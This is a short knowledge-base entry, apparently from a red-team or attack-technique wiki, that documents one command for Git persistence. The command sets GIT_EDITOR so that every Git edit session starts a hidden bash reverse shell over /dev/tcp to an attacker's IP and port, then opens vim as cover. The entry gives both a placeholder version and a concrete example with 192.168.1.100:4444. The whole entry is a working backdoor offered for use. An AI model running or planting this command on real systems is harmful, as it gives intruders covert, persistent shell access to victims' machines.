---
type: command
executor: bash
data: >-
  export GIT_EDITOR='nohup bash -c "bash -i >&
  /dev/tcp/$_ATTACKER_IP/$_BACKDOOR_PORT 0>&1" >/dev/null 2>&1 & vim'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - git
  - environment
  - backdoor
verified: true
validated: true
---

# export-git-editor

## Command

```bash
export GIT_EDITOR='nohup bash -c "bash -i >& /dev/tcp/$_ATTACKER_IP/$_BACKDOOR_PORT 0>&1" >/dev/null 2>&1 & vim'
```

## Description

Sets the GIT_EDITOR environment variable to inject backdoor on Git edit sessions, overriding config if needed.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `GIT_EDITOR` | Editor env var | Yes |
| `$_ATTACKER_IP` | IP address | Yes |
| `$_BACKDOOR_PORT` | Port | Yes |

## Examples

### Basic Usage

```bash
export GIT_EDITOR='nohup bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" >/dev/null 2>&1 & vim'
```

## Expected Output

No output.

## Related

- [[procedures/Backdoor-Git-User-Configurations-for-Persistence]]
